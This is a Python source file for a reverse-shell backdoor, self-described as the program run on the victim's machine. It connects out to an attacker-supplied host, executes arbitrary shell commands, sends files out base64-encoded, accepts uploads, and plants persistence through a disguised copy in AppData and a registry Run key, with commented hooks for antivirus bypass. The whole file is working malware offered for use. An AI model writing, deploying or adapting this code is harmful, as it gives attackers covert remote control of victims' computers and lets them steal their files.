# This is the python program which use by victim

__author__ = 'Yasiru Senerath Karunanayka'
__date__ = '06-jun-2019'

import socket
import subprocess
import os
import json
import shutil
import sys
import base64
# import avpersistence


class Backdoor:
    def __init__(self, ip, port):
        self.port = int(port)
        self.ip = ip

        # creating socket object called connection
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # connecting to the port
        self.connection.connect((self.ip, self.port))
        # sending data to the hacker
        # self.become_persistence()

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    @staticmethod
    def become_persistence():
        evil_location = os.environ['appdata'] + '\\Windows Client.exe'
        if not os.path.exists(evil_location):
            shutil.copyfile(sys.executable, evil_location)
            registry = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v client /t REG_SZ /d "'
            subprocess.call(registry + evil_location + '"')

    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def execute_command(command):
        command_string = ''
        for item in command:
            command_string = command_string + item + ' '
        try:
            DEVNULL = open(os.devnull, 'wb')
            output = subprocess.check_output(command_string[:-1], shell=True, stderr=DEVNULL, stdin=DEVNULL)
            if output == b'':
                output = '[+]Command executed\n'.encode('utf-8')
        except subprocess.CalledProcessError:
            output = '[-]Command not executed\n'.encode('utf-8')
        return output

    @staticmethod
    def execute_command_call(command):
        command_string = ''
        for item in command:
            command_string = command_string + item + ' '
        try:
            DEVNULL = open(os.devnull, 'wb')
            subprocess.call(command_string[:-1], shell=True, stderr=DEVNULL, stdin=DEVNULL)
            output = '[+]Command executed\n'.encode('utf-8')
        except subprocess.CalledProcessError:
            output = '[-]Command not executed\n'.encode('utf-8')
        return output

    def change_directory(self, directory):
        try:
            directory_string = ''
            for item in directory:
                directory_string = directory_string + item + ' '

            os.chdir(directory_string[:-1])
            self.reliable_send('[+]Directory Changed ' + os.getcwd() + '\n')
        except Exception:
            self.reliable_send('[-]No such directory {}\n'.format(directory_string))

    def download(self, file_name):
        f_name = ''
        for item in file_name:
            f_name = f_name + item

        file_path = os.getcwd()
        full_file_name = file_path + '/' + f_name
        try:
            with open(full_file_name, 'rb') as my_file:
                file_content = my_file.read()
                self.reliable_send(base64.b64encode(file_content))
        except:
            self.reliable_send('')

    def upload(self, file_name):
        location = os.getcwd()
        full_file_path = location + '/' + file_name
        try:
            with open(full_file_path, 'wb') as my_file:
                file_content = self.reliable_receive()
                my_file.write(base64.b64decode(file_content))
            self.reliable_send('ok')
        except:
            self.reliable_send('')

    def start(self):
        while True:
            # receiving data from hacker
            command = self.reliable_receive()

            if command[0] == 'quit':
                self.reliable_send('')
                sys.exit(0)

            elif command[0] == 'cd':
                self.change_directory(command[1:])

            elif command[0] == 'download':
                self.download(command[1:])

            elif command[0] == 'upload':
                self.upload(command[1])

            elif command[0] == 'run':
                self.execute_command_call(command[1:])

            else:
                result = self.execute_command(command)
                self.reliable_send(result)


# persistence_module = avpersistence.AvPersistence('client_module.exe')
# persistence_module.bypass_antivirus()
# persistence_module.become_persistence()
